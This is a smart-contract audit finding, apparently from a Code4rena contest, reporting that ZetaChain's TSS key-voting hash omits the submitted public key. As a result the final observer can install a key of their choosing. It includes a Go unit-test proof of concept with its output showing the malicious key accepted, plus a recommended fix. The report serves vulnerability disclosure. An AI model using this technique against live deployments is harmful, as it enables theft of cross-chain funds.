# [H] TSS Key Voting Hash Collision

## Summary
Severity: High
Chain: Smart contract
Component: 2023-11-zetachain
Published: 2023-11-28
Source: https://github.com/code-423n4/2023-11-zetachain-findings/issues/133
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-11-zetachain/blob/2834e3f85b2c7774e97413936018a0814c57d860/repos/node/x/crosschain/types/message_tss_voter.go#L51-L54


# Vulnerability details

## Impact
The *Observer* role is somewhat sensitive but a single observer should not be able to influence a single action to happen. There are multiple observers with parts of the TSS key that vote on events occurring on other chains. From the documentation, *"Its important to ensure that at no time is any single entity or small fraction of nodes able to sign messages on behalf of ZetaChain on external chains"*.

When an observer is added, an observer is removed or the admin simply asks, the TSS key is regenerated. The full flow of this is explained below: 

1. Start keygen is triggered. 
2. Zetaclient does the key generation process with the other observers.
3. Observers vote on the new public key via the ``CreateTSSVoter`` message to Zetachain.
4. The vote passes once 100% of Observers have voted. This updates the TSS address on Zetachain, which is then used by the Zetaclient and many other things.
5. ``MigrateTSSFunds`` message is sent to transfer funds from the old address to the new one for each chain, which is only callable by an admin group.
6. TSS address is updated on all chains manually for the ERC20Custody contract and Connectors by the admin.
7. Admin turns on inbound transactions. 
8. Everything should be functional again.

Since the TSS (threshold signature) contains all of the funds for the various blockchains (BTC, ETH, etc.) and has complete power to perform actions on the ``Connector`` contract, this process must be done securely.

The voting process for this has a catastrophic flaw: the hash used for the voting index does NOT include the public key being voted on. Since this hash is what determines if two votes are the same, the final observer can submit a public key that will be used as the voted on key. The TSS voting requires 100% of voters to agree, making it trivial to time this as the last voter. 

If an attacker exploits this, the ``MigrateTSSFunds`` message will send all of the TSS value (BTC, ETH, etc.) to an attacker controlled address. Additionally, the TSS address will be used for parsing events and for access control on the connector contract, allowing for complete compromise of these as well transactions as well. So, practically all funds are possible to steal and funds can be created out of thin air.

## Proof of Concept
The proof of concept below was added into the ``msg_tss_voter_test.go`` file under the ``x/crosschain/keeper/`` path. This creates 4 observers and the final observer submits the malicious public key. Since the vote passes and the TSS address is replaced, this will be used by the zetaclient for future operations and by the admin on the ``MigrateTSSFunds`` call.

To run, use the command ``go test -v ./x/crosschain/keeper/ -run TestTssHashCollision``.

```go
package keeper_test

import (
	"fmt"
	"testing"

	"github.com/zeta-chain/zetacore/common"
	keepertest "github.com/zeta-chain/zetacore/testutil/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/types"
	observerTypes "github.com/zeta-chain/zetacore/x/observer/types"
	observertypes "github.com/zeta-chain/zetacore/x/observer/types"
)

func TestTssHashCollision(t *testing.T) {

	// List of observers to use for voting
	observer1Address := "zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k"
	observer2Address := "zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935"
	observer3Address := "zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch"
	observer4Address := "zeta1g323lusfa9qqvjvupajre2dphuem999fahc086"

	observers := []string{observer1Address, observer2Address, observer3Address, observer4Address}

	k, ctx, _, zk := keepertest.CrosschainKeeper(t)

	msgServer := keeper.NewMsgServerImpl(*k)

	/*
		Setup various things for testing
	*/
	// Set the chain ids we want to use to be valid
	params := observertypes.DefaultParams()
	zk.ObserverKeeper.SetParams(
		ctx, params,
	)

	// Add validator to the observer list for voting
	// Normally happens within MsgAddObserver
	chains := zk.ObserverKeeper.GetParams(ctx).GetSupportedChains()
	for _, chain := range chains {
		zk.ObserverKeeper.SetObserverMapper(ctx, &observertypes.ObserverMapper{
			ObserverChain: chain,
			ObserverList:  []string{observer1Address, observer2Address, observer3Address, observer4Address},
		})
	}
	// Add to privileged node list. Normally happens within MsgAddObserver
	for _, address := range observers {
		pubkeySet := common.PubKeySet{Secp256k1: "", Ed25519: ""}
		zk.ObserverKeeper.SetNodeAccount(ctx, observerTypes.NodeAccount{
			Operator:       address, // Make the same as the things above later..
			GranteeAddress: address,
			GranteePubkey:  &pubkeySet,                      // DK
			NodeStatus:     observerTypes.NodeStatus_Active, // DK
		})
	}

	// Turn on the keygen process for a moment
	item := observerTypes.Keygen{
		BlockNumber: 10,
	}
	zk.ObserverKeeper.SetKeygen(ctx, item)

	// List of messages to use
	msg := &types.MsgCreateTSSVoter{
		Creator:          observer1Address,
		TssPubkey:        "Key1", // Key1
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}
	msg2 := &types.MsgCreateTSSVoter{
		Creator:          observer2Address,
		TssPubkey:        "Key1", // Key2 - different than key1!
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}
	msg3 := &types.MsgCreateTSSVoter{
		Creator:          observer3Address,
		TssPubkey:        "Key1", // Key2 - different than key1!
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}
	msg4 := &types.MsgCreateTSSVoter{
		Creator:          observer4Address,
		TssPubkey:        "MaliciousKeyThatOnlyIVotedOn", // Key2 - different than key1!
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}

	if msg.Digest() == msg4.Digest() {
		fmt.Println("=======================")
		fmt.Println("Voting hash collision!")
		fmt.Println("=======================")
	}
	fmt.Println("Msg.digest() on msg1 and msg4- ", msg.Digest(), msg4.Digest())
	fmt.Println("Msg1: ", msg)
	fmt.Println("Msg4: ", msg4)

	// Currently failing
	res, err := msgServer.CreateTSSVoter(
		ctx,
		msg,
	)
	res2, err2 := msgServer.CreateTSSVoter(
		ctx,
		msg2,
	)
	res3, err3 := msgServer.CreateTSSVoter(
		ctx,
		msg3,
	)

	res4, err4 := msgServer.CreateTSSVoter(
		ctx,
		msg4,
	)

	fmt.Println(res, err)
	fmt.Println(res2, err2)
	fmt.Println(res3, err3)
	fmt.Println(res4, err4)

	// Show that the vote for the given digest passed
	ballot, _ := zk.ObserverKeeper.GetBallot(ctx, msg.Digest())
	fmt.Println("Ballot: ", ballot)

	// KeyGen information. Passed with our information
	fmt.Println(zk.ObserverKeeper.GetKeygen(ctx))

	fmt.Println("Showing off the malicious key")
	fmt.Println("============================")
	tss, _ := k.GetTSS(ctx)
	fmt.Println(tss)
	fmt.Println("PublicKey: ", tss.TssPubkey)
}
```

Output of the test being ran: 

```
=== RUN   TestTssHashCollision
=======================
Voting hash collision!
=======================
Msg.digest() on msg1 and msg4-  3-tss-keygen 3-tss-keygen
Msg1:  creator:"zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k" tss_pubkey:"Key1" keyGenZetaHeight:3 status:Success 
Msg4:  creator:"zeta1g323lusfa9qqvjvupajre2dphuem999fahc086" tss_pubkey:"MaliciousKeyThatOnlyIVotedOn" keyGenZetaHeight:3 status:Success 
 <nil>
 <nil>
 <nil>
 <nil>
Ballot:  {3-tss-keygen 3-tss-keygen [zeta1g323lusfa9qqvjvupajre2dphuem999fahc086 zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935] [SuccessObservation SuccessObservation SuccessObservation SuccessObservation] TSSKeyGen 1.000000000000000000 BallotFinalized_SuccessObservation 1}
{KeyGenSuccess [] 1} true
Showing off the malicious key
============================
{MaliciousKeyThatOnlyIVotedOn [] [zeta1g323lusfa9qqvjvupajre2dphuem999fahc086 zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935] 1 3}
PublicKey:  MaliciousKeyThatOnlyIVotedOn
--- PASS: TestTssHashCollision (0.01s)
PASS
```

## Tools Used
- Manual review

## Recommended Mitigation Steps
- Use the ``publicKey`` being submitted as part of the hash. In fact, just including all parts of the message (besides the creator and yes/no vote) should be added in to ensure the security of the platform.
- Many of the other locations simply take a hash of the message minus a few fields, such as [here](https://github.com/code-423n4/2023-11-zetachain/blob/2834e3f85b2c7774e97413936018a0814c57d860/repos/node/x/observer/types/message_add_blame_vote.go#L54)








## Assessed type

Invalid Validation
